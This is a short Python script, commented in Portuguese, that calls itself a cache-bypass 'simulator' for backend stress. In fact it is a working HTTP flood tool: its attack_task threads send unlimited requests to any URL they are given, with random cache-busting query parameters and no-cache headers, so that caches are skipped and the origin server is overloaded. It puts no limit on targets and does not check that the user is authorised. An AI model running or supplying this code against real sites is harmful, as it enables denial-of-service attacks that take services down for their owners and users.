#!/usr/bin/env python3
import sys
import argparse
import threading
import time
import random
import string
import urllib.request
import urllib.parse
import urllib.error

# Configuração de cores
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

stats = {
    "requests": 0,
    "success": 0,
    "errors": 0
}
running = True

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_cache_busted_url(base_url):
    parts = list(urllib.parse.urlparse(base_url))
    query = dict(urllib.parse.parse_qsl(parts[4]))

    # Adicionar parâmetro único de cache busting
    query[f"cb_{random_string(4)}"] = random_string(8)
    # Adicionar timestamp
    query["_"] = str(int(time.time() * 1000))

    parts[4] = urllib.parse.urlencode(query)
    return urllib.parse.urlunparse(parts)

def attack_task(url):
    global stats, running

    while running:
        try:
            target_url = get_cache_busted_url(url)
            req = urllib.request.Request(target_url)

            # Headers anti-cache
            req.add_header("Cache-Control", "no-cache, no-store, must-revalidate")
            req.add_header("Pragma", "no-cache")
            req.add_header("Expires", "0")
            req.add_header("User-Agent", "CacheBuster/1.0")

            with urllib.request.urlopen(req, timeout=5) as response:
                stats["requests"] += 1
                if 200 <= response.status < 300:
                    stats["success"] += 1
                else:
                    stats["errors"] += 1

        except Exception:
            stats["errors"] += 1

def monitor_thread():
    global stats, running
    while running:
        print(f"\r{Colors.OKBLUE}[*] Cache Bypass ({stats['requests']} reqs) | Success: {stats['success']} | Errors: {stats['errors']}{Colors.ENDC}", end="")
        time.sleep(1)

def main():
    global running
    parser = argparse.ArgumentParser(description="Simulador de Cache Bypass (Backend Stress)")
    parser.add_argument("url", help="URL alvo")
    parser.add_argument("--threads", type=int, default=10, help="Número de threads simultâneas")
    parser.add_argument("--duration", type=int, default=60, help="Duração (s)")

    args = parser.parse_args()

    print(f"{Colors.HEADER}=== Iniciando Cache Bypass Simulator ==={Colors.ENDC}")
    print(f"Alvo: {args.url}")
    print("Estratégia: Headers 'no-cache' + Random Query Params")

    monitor = threading.Thread(target=monitor_thread)
    monitor.daemon = True
    monitor.start()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack_task, args=(args.url,))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Interrompido!{Colors.ENDC}")

    running = False
    print(f"\n{Colors.OKGREEN}Simulação finalizada.{Colors.ENDC}")

if __name__ == "__main__":
    main()
